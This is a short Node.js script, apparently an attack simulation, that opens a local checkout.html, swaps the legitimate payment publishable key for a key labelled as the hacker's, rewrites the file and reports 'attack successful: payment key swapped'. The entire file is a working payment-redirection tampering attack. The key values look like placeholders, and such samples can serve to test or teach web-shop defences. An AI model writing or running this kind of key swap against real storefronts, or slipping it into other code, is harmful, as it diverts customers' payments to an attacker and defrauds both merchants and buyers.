const fs = require('fs');
const path = require('path');

const filePath = path.join(__dirname, 'checkout.html');
const searchString = 'pk_test_legit_key_123';
const replaceString = 'pk_hacker_stolen_key_999';

try {
    // 1. Read the existing checkout.html file
    let htmlContent = fs.readFileSync(filePath, 'utf8');

    // 2. Swap the legitimate key with the hacker key
    if (htmlContent.includes(searchString)) {
        htmlContent = htmlContent.replace(searchString, replaceString);

        // 3. Overwrite the file with the modified content
        fs.writeFileSync(filePath, htmlContent, 'utf8');
        
        // 4. Print success message
        console.log('attack successful: payment key swapped');
    } else {
        console.log('Target key not found in the file.');
    }
} catch (error) {
    console.error('Error modifying the file:', error.message);
}